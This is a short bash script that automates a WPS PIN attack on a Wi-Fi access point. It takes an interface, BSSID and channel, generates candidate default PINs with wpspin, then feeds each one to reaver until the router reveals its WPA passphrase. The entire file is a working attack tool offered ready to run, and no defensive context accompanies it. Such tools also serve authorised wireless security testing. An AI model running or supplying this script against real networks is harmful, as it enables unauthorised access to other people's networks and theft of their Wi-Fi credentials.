#!/bin/bash
read -p "Interface to use: " interface
read -p "BSSID: " bssid
read -p "Channel: " channel
PINS="$(wpspin -A $bssid | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' ')"

for PIN in $PINS
do
    echo Attempting PIN: $PIN
    OUTPUT="$(sudo reaver --max-attempts=1 -r 3:45 -i $interface -b $bssid -c $channel -p $PIN)"
		echo $OUTPUT
		if [[ "$OUTPUT" =~ "[+] WPA PSK" ]]; then
			echo "\n[+] SUCCESS: $PIN\n"
			exit 0
		fi
		echo -e "$PIN dont work\n"
		sleep 1
done
echo "Completed"
